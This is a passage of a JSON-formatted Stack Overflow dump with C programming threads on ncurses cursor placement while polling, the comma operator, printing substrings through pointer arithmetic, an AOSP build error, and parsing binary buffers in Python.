"https://stackoverflow.com/users/10831755/mjm"}, "reply_to_user": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1545769029, "post_id": 53922334, "comment_id": 94692266, "body": "It is right on the top :)"}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "edited": false, "score": 0, "creation_date": 1545783242, "post_id": 53922334, "comment_id": 94694407, "body": "<code>getch</code> does a <code>refresh</code>, which appears to be the point of this question."}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "edited": false, "score": 0, "creation_date": 1545783312, "post_id": 53922334, "comment_id": 94694415, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/53251589/refresh-behaviour-ncurses\">Refresh Behaviour (nCurses)</a>"}, {"owner": {"reputation": 11, "user_id": 10831755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5fe4d75d155852dc6949bc21f3e82e4c?s=128&d=identicon&r=PG&f=1", "display_name": "mjm", "link": "https://stackoverflow.com/users/10831755/mjm"}, "reply_to_user": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "edited": false, "score": 0, "creation_date": 1545788171, "post_id": 53922334, "comment_id": 94694897, "body": "@ThomasDickey thanks! I was confused by the documentation for <code>update_panels</code>, which specifically tells the user not to use <code>refresh</code> and <code>wrefresh</code>, without mentioning that <code>getch</code> does it anyway. And <code>update_panels</code> by itself doesn&#39;t leave the cursor at the position of the last move, as per <a href=\"https://stackoverflow.com/a/42637846/10831755\">this answer to Ncurses place cursor in correct panel</a>. Replacing the dummy <code>wgetch</code> with <code>wrefresh</code> and removing the <code>nodelay</code> indeed works."}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 10831755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5fe4d75d155852dc6949bc21f3e82e4c?s=128&d=identicon&r=PG&f=1", "display_name": "mjm", "link": "https://stackoverflow.com/users/10831755/mjm"}, "is_accepted": true, "score": 1, "last_activity_date": 1545864678, "last_edit_date": 1545864678, "creation_date": 1545764271, "answer_id": 53924891, "question_id": 53922334, "link": "https://stackoverflow.com/questions/53922334/ncurses-panel-cursor-position-and-polling-stdin/53924891#53924891", "title": "ncurses, panel, cursor position, and polling STDIN", "body": "<p>I think adding a <code>wrefresh</code> is the right way to show the cursor, judging by <a href=\"https://stackoverflow.com/questions/43641703/ncurses-forms-show-editing-cursor-highlight-active-field/43653131#43653131\">this answer</a> (<strong>EDIT</strong> updated after @Thomas Dickey's comment: <code>wgetch</code> is not necessary). So it boils down to:</p>\n\n<pre><code>nodelay(win_a);           // to make wgetch non-blocking\n\n/* ... */\n\nwrefresh(win_a);          // to show the cursor\npoll(poll_fds, 2, -1);\nif (poll_fds[0].revents &amp; POLLIN) {\n    ch = wgetch(win_a);   // to get the actual character\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 10831755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5fe4d75d155852dc6949bc21f3e82e4c?s=128&d=identicon&r=PG&f=1", "display_name": "mjm", "link": "https://stackoverflow.com/users/10831755/mjm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 188, "favorite_count": 1, "accepted_answer_id": 53924891, "answer_count": 1, "score": 0, "last_activity_date": 1545924968, "creation_date": 1545740375, "last_edit_date": 1592644375, "question_id": 53922334, "link": "https://stackoverflow.com/questions/53922334/ncurses-panel-cursor-position-and-polling-stdin", "title": "ncurses, panel, cursor position, and polling STDIN", "body": "<p>I'm trying to write a program using ncurses that polls various file descriptors in the main loop. I managed to trim it down to an example with a single file descriptor, and this expected behavior:</p>\n<ul>\n<li>There are two windows, managed by the panel library.</li>\n<li>Pressing space moves the cursor right, wrapping around when it reaches the end of the first window.</li>\n<li>Pressing 't' changes the text in the top left corner.</li>\n<li>Pressing 'q' quits the program.</li>\n</ul>\n<p>Code:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;panel.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;poll.h&gt;\n#include &lt;sys/eventfd.h&gt;\n\n#define POLL_STDIN\n\nint main() {\n    int event_fd, cursor_x, cursor_y, ch, n_fds;\n    bool trigd;\n    uint64_t event;\n    WINDOW *win_a, *win_b;\n    PANEL *panel_a, *panel_b;\n\n    event_fd = eventfd(0, 0);\n    if (event_fd &lt; 0) {\n        perror(&quot;eventfd&quot;);\n        exit(1);\n    }\n\n    struct pollfd poll_fds[2];\n\n    poll_fds[0].fd = STDIN_FILENO;\n#ifdef POLL_STDIN\n    poll_fds[0].events = POLLIN;\n#else\n    poll_fds[0].events = 0;\n#endif\n\n    poll_fds[1].fd = event_fd;\n    poll_fds[1].events = POLLIN;\n\n    initscr();\n    halfdelay(1);\n    noecho();\n\n    win_a = newwin(10, 10, 0, 0);\n    win_b = newwin(10, 10, 0, 10);\n\n    panel_a = new_panel(win_a);\n    panel_b = new_panel(win_b);\n\n    cursor_x = 0;\n    cursor_y = 0;\n    wmove(win_a, cursor_y, cursor_x);\n\n    do {\n        for (int i=0; i&lt;10; ++i) {\n            for (int j=0; j&lt;10; ++j) {\n                mvwaddch(win_a, i, j, '.');\n                mvwaddch(win_b, i, j, '_');\n            } \n        }\n\n        mvwprintw(win_a, 0, 0, trigd ? &quot;foo&quot; : &quot;bar&quot;);\n\n        update_panels();\n        doupdate();\n    \n        wmove(win_a, cursor_y, cursor_x);\n\n#ifdef POLL_STDIN\n        n_fds = poll(poll_fds, 2, -1);\n#else\n        n_fds = poll(poll_fds, 2, 0);\n#endif\n\n        if (n_fds &lt; 0) {\n            perror(&quot;poll&quot;);\n            break;\n        }\n\n        ch = wgetch(win_a);\n\n        if (poll_fds[1].revents &amp; POLLIN) {\n            if (read(event_fd, &amp;event, 8) != 8) {\n                perror(&quot;read&quot;);\n                break;\n            }\n            trigd = !trigd;\n        }\n\n        if (' ' == ch) {\n            cursor_x = (cursor_x + 1) % 10;\n        } else if ('t' == ch) {\n            event = 1;\n            if (write(event_fd, &amp;event, 8) != 8) {\n                perror(&quot;write&quot;);\n                break;\n            }\n        }\n    } while ('q' != ch);\n\n    endwin();\n\n    return 0;\n}\n</code></pre>\n<p>If <code>POLL_STDIN</code> is not defined, the program works as expected. If it is defined, the program works almost the same, but the cursor is displayed in the lower right corner in window B, and doesn't move. After pressing <code>t</code> the cursor temporarily moves to the expected position.</p>\n<p>I have looked at the program after running the preprocessor and found nothing unexpected, only <code>mvaddch</code> gets expanded.</p>\n<p>I just think that the busy-waiting version is kind of inelegant, and also would like to know why the cursor is displayed in the wrong place after a seemingly unrelated change.</p>\n<h3>EDIT:</h3>\n<p>I've figured out that calling <code>getch</code> is what makes the cursor to show. After using <code>nodelay</code> on both windows, and calling <code>getch</code> twice, the program now works in both versions, and the second <code>getch</code> can be made conditional. Here's the updated code:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;panel.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;poll.h&gt;\n#include &lt;sys/eventfd.h&gt;\n\nint main() {\n    int event_fd, cursor_x, cursor_y, ch, n_fds;\n    bool trigd;\n    uint64_t event;\n    WINDOW *win_a, *win_b;\n    PANEL *panel_a, *panel_b;\n\n    event_fd = eventfd(0, 0);\n    if (event_fd &lt; 0) {\n        perror(&quot;eventfd&quot;);\n        exit(1);\n    }\n\n    struct pollfd poll_fds[2];\n\n    poll_fds[0].fd = STDIN_FILENO;\n    poll_fds[0].events = POLLIN;\n\n    poll_fds[1].fd = event_fd;\n    poll_fds[1].events = POLLIN;\n\n    initscr();\n    cbreak();\n    noecho();\n\n    win_a = newwin(10, 10, 0, 0);\n    win_b = newwin(10, 10, 0, 10);\n\n    panel_a = new_panel(win_a);\n    panel_b = new_panel(win_b);\n\n    cursor_x = 0;\n    cursor_y = 0;\n    wmove(win_a, cursor_y, cursor_x);\n\n    do {\n        for (int i=0; i&lt;10; ++i) {\n            for (int j=0; j&lt;10; ++j) {\n                mvwaddch(win_a, i, j, '.');\n                mvwaddch(win_b, i, j, '_');\n            } \n        }\n\n        mvwprintw(win_a, 0, 0, trigd ? &quot;foo&quot; : &quot;bar&quot;);\n\n        update_panels();\n        doupdate();\n    \n        wmove(win_a, cursor_y, cursor_x);\n        wrefresh(win_a);\n\n        n_fds = poll(poll_fds, 2, -1);\n\n        if (n_fds &lt; 0) {\n            perror(&quot;poll&quot;);\n            break;\n        }\n\n        if (poll_fds[0].revents &amp; POLLIN) {\n            ch = wgetch(win_a);\n        }\n\n        if (poll_fds[1].revents &amp; POLLIN) {\n            if (read(event_fd, &amp;event, 8) != 8) {\n                perror(&quot;read&quot;);\n                break;\n            }\n            trigd = !trigd;\n        }\n\n        if (' ' == ch) {\n            cursor_x = (cursor_x + 1) % 10;\n        } else if ('t' == ch) {\n            event = 1;\n            if (write(event_fd, &amp;event, 8) != 8) {\n                perror(&quot;write&quot;);\n                break;\n            }\n        }\n    } while ('q' != ch);\n\n    endwin();\n\n    return 0;\n}\n</code></pre>\n<p>I'm not sure if this is the best way to show the cursor, but I'll post it as the answer if no one else posts one.</p>\n<h3>EDIT2:</h3>\n<p>Edited code for posterity after @Thomas Dickey's comment.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1545738611, "post_id": 53922059, "comment_id": 94686038, "body": "The return value of <code>++p</code> is the value <i>after</i> increment, so -6"}, {"owner": {"reputation": 1405, "user_id": 1764528, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e6da340d12df3f5e4c7a53681a9ac91e?s=128&d=identicon&r=PG", "display_name": "DollarAkshay", "link": "https://stackoverflow.com/users/1764528/dollarakshay"}, "edited": false, "score": 0, "creation_date": 1545738862, "post_id": 53922059, "comment_id": 94686098, "body": "I think this is undefined behavior. <a href=\"https://stackoverflow.com/questions/22817517/do-parentheses-force-order-of-evaluation-and-make-an-undefined-expression-define\" title=\"do parentheses force order of evaluation and make an undefined expression define\">stackoverflow.com/questions/22817517/&hellip;</a>"}, {"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "reply_to_user": {"reputation": 1405, "user_id": 1764528, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e6da340d12df3f5e4c7a53681a9ac91e?s=128&d=identicon&r=PG", "display_name": "DollarAkshay", "link": "https://stackoverflow.com/users/1764528/dollarakshay"}, "edited": false, "score": 5, "creation_date": 1545738900, "post_id": 53922059, "comment_id": 94686103, "body": "@AkshayLAradhya: again, no. <code>,</code> introduces a sequence point."}], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 3767495, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75b194f6799f6dfd1df4fbf3624ec408?s=128&d=identicon&r=PG&f=1", "display_name": "user3767495", "link": "https://stackoverflow.com/users/3767495/user3767495"}, "edited": false, "score": 0, "creation_date": 1545738723, "post_id": 53922117, "comment_id": 94686058, "body": "So, that means even if it was p++, it is executed and the value is changed?"}, {"owner": {"reputation": 1095, "user_id": 7813604, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c05e209ba1c9aecc893a588b77b5d82f?s=128&d=identicon&r=PG&f=1", "display_name": "Kindred", "link": "https://stackoverflow.com/users/7813604/kindred"}, "reply_to_user": {"reputation": 129, "user_id": 3767495, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75b194f6799f6dfd1df4fbf3624ec408?s=128&d=identicon&r=PG&f=1", "display_name": "user3767495", "link": "https://stackoverflow.com/users/3767495/user3767495"}, "edited": false, "score": 0, "creation_date": 1545738769, "post_id": 53922117, "comment_id": 94686069, "body": "@user3767495 Think like this: after all, when <code>p++</code> is done, the <code>p</code> is incremented."}], "tags": [], "owner": {"reputation": 1095, "user_id": 7813604, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c05e209ba1c9aecc893a588b77b5d82f?s=128&d=identicon&r=PG&f=1", "display_name": "Kindred", "link": "https://stackoverflow.com/users/7813604/kindred"}, "is_accepted": false, "score": 6, "last_activity_date": 1545738902, "last_edit_date": 1545738902, "creation_date": 1545738608, "answer_id": 53922117, "question_id": 53922059, "link": "https://stackoverflow.com/questions/53922059/understanding-post-and-pre-increment-with-comma-in-between/53922117#53922117", "title": "Understanding post and pre increment with comma in between", "body": "<p>Because for a comma operator <code>A,B</code> then <code>A</code> is done first then <code>B</code>, and <code>p++</code> increment the <code>p</code>, and <code>++p</code> also increment the <code>p</code>. <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">Operator precedence</a>.</p>\n\n<p>Or think like this</p>\n\n<pre><code>int i = (p++, ++p);\n</code></pre>\n\n<p>is </p>\n\n<pre><code>p++;\nint i = ++p;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 4, "last_activity_date": 1545738703, "creation_date": 1545738703, "answer_id": 53922125, "question_id": 53922059, "link": "https://stackoverflow.com/questions/53922059/understanding-post-and-pre-increment-with-comma-in-between/53922125#53922125", "title": "Understanding post and pre increment with comma in between", "body": "<p>The expression <code>(p++, ++p)</code> has a <a href=\"https://en.wikipedia.org/wiki/Comma_operator\" rel=\"nofollow noreferrer\"><em>comma operator</em></a>. The comma operator evaluates its operand left-to-right and yields the result of the right most operand. Thus <code>i</code> gets the value <code>-6</code> (after <code>p++</code> and <code>++p</code> operations).</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 10793975, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/g48vb.jpg?s=128&g=1", "display_name": "Yaya", "link": "https://stackoverflow.com/users/10793975/yaya"}, "is_accepted": false, "score": 2, "last_activity_date": 1545739072, "creation_date": 1545739072, "answer_id": 53922169, "question_id": 53922059, "link": "https://stackoverflow.com/questions/53922059/understanding-post-and-pre-increment-with-comma-in-between/53922169#53922169", "title": "Understanding post and pre increment with comma in between", "body": "<p>as ptr_user7813604 said, you are using the comma operator which is a binary operator in c.\nIt evaluates it's first operand (in your case p++ increments p) and then discards the result (meaning p was incremented but not assigned to any variable) and then it evaluates the second operand (in your case ++p increments p) and returns this value and type. because the second operand is ++p so you receive the value after it was incremented, if the second operand was another p++ you would have assigned to i the value before it was incremented.</p>\n\n<p>for additional information about the comma operator you can look up <a href=\"https://en.wikipedia.org/wiki/Comma_operator\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Comma_operator</a>.</p>\n"}], "owner": {"reputation": 129, "user_id": 3767495, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75b194f6799f6dfd1df4fbf3624ec408?s=128&d=identicon&r=PG&f=1", "display_name": "user3767495", "link": "https://stackoverflow.com/users/3767495/user3767495"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "closed_date": 1545743508, "answer_count": 3, "score": 2, "last_activity_date": 1545739670, "creation_date": 1545738243, "last_edit_date": 1545739670, "question_id": 53922059, "link": "https://stackoverflow.com/questions/53922059/understanding-post-and-pre-increment-with-comma-in-between", "closed_reason": "Duplicate", "title": "Understanding post and pre increment with comma in between", "body": "<p>Consider the below program</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nvoid main(){\n    int p = -8;\n    int i = (p++, ++p);\n    printf(\"%d\\n\", i);\n}\n</code></pre>\n\n<p>I am unable to get why the output is -6.</p>\n\n<p><code>p++</code> would increment after the assignment statement is executed, <code>++p</code> will increment before thereby making -8 to -7.</p>\n\n<p>How <code>i</code> is assigned -6?</p>\n"}, {"tags": ["c", "pointers", "char", "sequence"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1545737015, "post_id": 53921846, "comment_id": 94685647, "body": "Is modifying <code>s</code> an option? You duplicated it, so I suspect that shouldn&#39;t be an issue."}], "answers": [{"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1545753899, "post_id": 53921881, "comment_id": 94689332, "body": "M.M said <code>You can</code> and you said: <code>You cannot</code>. :))"}], "tags": [], "owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "is_accepted": false, "score": 1, "last_activity_date": 1545736836, "creation_date": 1545736836, "answer_id": 53921881, "question_id": 53921846, "link": "https://stackoverflow.com/questions/53921846/displaying-pointer-substraction/53921881#53921881", "title": "Displaying pointer substraction", "body": "<p>You cannot. The string is saved as a sequence of letters ending in a zero byte. If you print a pointer as a string, you will tell it to print the sequence up to the zero byte, which is how you get <code>cdefg</code> and <code>defg</code>. There is no sequence of bytes that has <code>'a', 'b', 0</code> - you would need to copy that into a new char array. <code>s - p</code> will simply give you <code>2</code> (the distance between the two) - there is no amount of pointer arithmetic that will copy a sequence for you.</p>\n\n<p>To get a substring, see <a href=\"https://stackoverflow.com/questions/2114377/strings-in-c-how-to-get-substring\">Strings in C, how to get subString</a> - copy with <code>strncpy</code>, then place a null terminator.</p>\n"}, {"tags": [], "owner": {"reputation": 6578, "user_id": 10524386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe8a1950a1d7e1eccd4cff228c5420ea?s=128&d=identicon&r=PG", "display_name": "grapes", "link": "https://stackoverflow.com/users/10524386/grapes"}, "is_accepted": false, "score": 1, "last_activity_date": 1545737279, "creation_date": 1545737279, "answer_id": 53921940, "question_id": 53921846, "link": "https://stackoverflow.com/questions/53921846/displaying-pointer-substraction/53921940#53921940", "title": "Displaying pointer substraction", "body": "<p>Okay, if you need to cut <code>p</code> from <code>s</code>, the following code should work:</p>\n\n<pre><code>char s[100];  // Use static mutable array\nstrcpy(s, \"abcdefg\");  // init array (ok, ok I dont remember the syntax how to init arrays)\nchar* p = strchr(s, 'c');// -&gt; cdefg\n*p = 0;  // cut the found substring off from main string\nprintf(\"%s\\n\", s); // -&gt; ab\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1545737445, "post_id": 53921943, "comment_id": 94685727, "body": "Fascinating. I had no idea the percision affected strings like that."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1545765309, "post_id": 53921943, "comment_id": 94691516, "body": "Is there any chance to save it in a <code>char*</code> pointer, something lile: <code>const char *ptr = (int)(p - s), s;</code> ?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1545771776, "post_id": 53921943, "comment_id": 94692762, "body": "@Michi a <code>char *</code> points to a character, the only thing you can store in a pointer is the address of a character"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1545822851, "post_id": 53921943, "comment_id": 94703067, "body": "@M.M You right. I really do not know where I was thinking. Probably <code>sprintf( buf, &quot;%.*s&quot;, (int)(p - s), s );</code>  will do the job. Thank you :)."}], "tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": true, "score": 7, "last_activity_date": 1545737294, "creation_date": 1545737294, "answer_id": 53921943, "question_id": 53921846, "link": "https://stackoverflow.com/questions/53921846/displaying-pointer-substraction/53921943#53921943", "title": "Displaying pointer substraction", "body": "<p>You can do:</p>\n\n<pre><code>printf(\"%.*s\", (int)(p - s), s);\n</code></pre>\n\n<p>This prints <code>s</code> with a maximum length of <code>p - s</code> which is the number of characters from <code>s</code> to <code>p</code>.</p>\n"}], "owner": {"reputation": 548, "user_id": 7179385, "user_type": "registered", "accept_rate": 36, "profile_image": "https://lh4.googleusercontent.com/-uUL3u-gr10s/AAAAAAAAAAI/AAAAAAAAAAc/idsQzobjuks/photo.jpg?sz=128", "display_name": "C. Cristi", "link": "https://stackoverflow.com/users/7179385/c-cristi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 1, "accepted_answer_id": 53921943, "answer_count": 3, "score": 4, "last_activity_date": 1545737294, "creation_date": 1545736582, "last_edit_date": 1545736765, "question_id": 53921846, "link": "https://stackoverflow.com/questions/53921846/displaying-pointer-substraction", "title": "Displaying pointer substraction", "body": "<p>Okay, say I have a sequence \"abcdefg\" and I do </p>\n\n<pre><code>char* s = strdup(\"abcdefg\");\nchar* p;\nchar* q;\np = strchr(s, 'c');// -&gt; cdefg\nq = strchr(p, 'd');// -&gt; defg\n</code></pre>\n\n<p>And I want to display <code>s - p</code> basically abcdefg - cdefg = ab, can I do this using pointer arithmetic?</p>\n"}, {"tags": ["c++", "c", "android-source"], "owner": {"reputation": 1386, "user_id": 5677024, "user_type": "registered", "accept_rate": 27, "profile_image": "https://lh6.googleusercontent.com/-h5aRiHG7eV8/AAAAAAAAAAI/AAAAAAAAABA/ctMc5su4ECQ/photo.jpg?sz=128", "display_name": "Vatish Sharma", "link": "https://stackoverflow.com/users/5677024/vatish-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2292, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1545734765, "creation_date": 1545734765, "question_id": 53921612, "link": "https://stackoverflow.com/questions/53921612/error-vndk-library-libandroid-nets-abi-has-extending-changes", "title": "Error: VNDK library: libandroid_net&#39;s ABI has EXTENDING CHANGES", "body": "<p>I am setting up an environment to run AOSP code on Ubuntu 18.04.1 LTS and got the error \"error: VNDK library: libandroid_net's ABI has EXTENDING CHANGES\". Please help me to resolve this. I have searched for hours but didn't get the solution.</p>\n\n<p>I have done following things:</p>\n\n<ol>\n<li>Installed required packages: <code>sudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev libgl1-mesa-dev libxml2-utils xsltproc unzip</code></li>\n<li>Installed community-maintained default set of udev rules for all Android devices: <code>apt-get install adb</code></li>\n<li>Install repo: <a href=\"https://source.android.com/setup/build/downloading.html\" rel=\"nofollow noreferrer\">https://source.android.com/setup/build/downloading.html</a>\n\n<ul>\n<li>mkdir ~/bin</li>\n<li>PATH=~/bin:$PATH</li>\n<li>curl <a href=\"https://storage.googleapis.com/git-repo-downloads/repo\" rel=\"nofollow noreferrer\">https://storage.googleapis.com/git-repo-downloads/repo</a> > ~/bin/repo</li>\n<li>chmod a+x ~/bin/repo</li>\n</ul></li>\n<li>Initializing a Repo client\n\n<ul>\n<li>mkdir WORK</li>\n<li>cd WORK</li>\n<li>git config --global user.name \"Your Name\"</li>\n<li>git config --global user.email \"you@example.com\"</li>\n<li>repo init -u <a href=\"https://android.googlesource.com/platform/manifest\" rel=\"nofollow noreferrer\">https://android.googlesource.com/platform/manifest</a></li>\n</ul></li>\n<li>Installed pixel 3 XL binaries which include google-devices and qcom blueline. Used Extractor and ./*.sh command to extract them.</li>\n<li>Copied qcom extracted vendor folder into Source Code and then copied pixel 3 xl vendor folder. Meged and replaced in all dialogs.</li>\n<li>Run <code>make clobber</code> to clean the build directory.</li>\n<li>Run <code>. build/envsetup.sh</code> to initialize the environment.</li>\n<li>Run <code>lunch aosp_arm-eng</code> to select your run target as asop_arm BUILD with eng BUILDTYPE.</li>\n<li>Run <code>make -j16</code> to build the code.</li>\n<li>Got build error: \n\n<ul>\n<li><code>error: VNDK library: libandroid_net's ABI has EXTENDING CHANGES</code></li>\n<li><code>OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000e7400000, 83886080, 0) failed; error='Not enough space' (errno=12)</code></li>\n<li><code>OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000cac00000, 73400320, 0) failed; error='Not enough space' (errno=12)</code></li>\n</ul></li>\n</ol>\n\n<p>For 'Not enough space' error: I am setting cache and configuring jack</p>\n\n<ul>\n<li><code>export USE_CCACHE=1</code> to enable compiler cache</li>\n<li>Failed to do <code>prebuilts/misc/linux-x86/ccache/ccache -M 15G</code> because there is no ccache folder exists.</li>\n<li><code>export ANDROID_JACK_VM_ARGS=\"-Xmx4g -Dfile.encoding=UTF-8 -XX:+TieredCompilation\"</code> to configure Jack.</li>\n</ul>\n\n<p>For resolving the VNDK issue I am not sure by may be binaries I have included are not correct so I have deleted the vendor folder that contains Pixel 3 XL binaries.</p>\n\n<p>I am a newbie for this task and just started a week ago to look into this.\nPlease suggest.\nThank you in advance.</p>\n"}, {"tags": ["python", "c", "buffer", "unions"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545734604, "post_id": 53921572, "comment_id": 94685042, "body": "<code>import struct</code>"}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1545734991, "post_id": 53921572, "comment_id": 94685148, "body": "You can define essentially identical structures and unions that are accessible from Python code by using the <a href=\"https://docs.python.org/3/library/ctypes.html#module-ctypes\" rel=\"nofollow noreferrer\"><code>ctypes</code></a> module. I think it would be less awkward than using the <code>struct</code> module."}], "owner": {"reputation": 13, "user_id": 10394975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bd0acd51ed35c8474ba6cb5c5b956d9?s=128&d=identicon&r=PG&f=1", "display_name": "Shorosky", "link": "https://stackoverflow.com/users/10394975/shorosky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 62, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1545735447, "creation_date": 1545734409, "last_edit_date": 1545735447, "question_id": 53921572, "link": "https://stackoverflow.com/questions/53921572/extracting-data-from-buffer-c-vs-python-advice", "title": "Extracting data from buffer C vs Python. Advice?", "body": "<p>When I work in C, and I get data on a rxbuffer and it can contain different kind of frames, I usually use a <code>struct</code> for each kind of frames, and put them together in a 